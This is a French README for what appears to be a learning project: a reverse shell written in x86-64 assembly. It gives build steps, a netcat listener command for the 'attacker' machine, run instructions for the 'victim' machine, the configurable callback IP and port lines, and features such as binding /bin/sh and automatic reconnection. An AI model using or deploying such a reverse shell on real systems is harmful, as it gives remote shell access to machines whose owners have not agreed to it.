# Reverse Shell en Assembleur x86-64

Un reverse shell léger implémenté en assembleur x86-64 qui se connecte d'une machine victime à une machine attaquante, liant un shell fonctionnel à travers une connexion réseau. Il dispose d'une gestion d'erreur robuste avec des tentatives de reconnexion automatiques et un code assembleur optimisé.

## Prérequis

- Système Linux x86-64
- NASM (Netwide Assembler)
- ld (GNU Linker)

## Compilation

```bash
make
```

Ou pour recompiler entièrement :

```bash
make re
```

## Utilisation

1. Sur la machine attaquante (celle qui va recevoir le shell) :
   ```bash
   nc -lvp 4444
   ```

2. Sur la machine victime (celle qui va exécuter le reverse shell) :
   ```bash
   ./reverse_shell
   ```

## Configuration

Par défaut, le reverse shell se connecte à `127.0.0.1` (localhost) sur le port `4444`.

Pour modifier l'adresse IP et le port, modifiez les lignes suivantes dans `reverse_shell.asm` :

```asm
ip dd 0x0100007f       ; 127.0.0.1 en format réseau (little-endian)
port dw 0x5c11         ; Port 4444 (0x115c)
```

## Fonctionnalités

- Connexion de la machine victime vers la machine attaquante
- Bind d'un shell (/bin/sh) à travers la connexion réseau
- Gestion d'erreur pour éviter les segmentation faults
- Tentatives de reconnexion automatiques (toutes les 5 secondes)
- Maximum de 10 tentatives de reconnexion
- Code assembleur optimisé

## Nettoyage

Pour supprimer les fichiers objets :
```bash
make clean
```

Pour supprimer tous les fichiers générés (y compris l'exécutable) :
```bash
make fclean
```
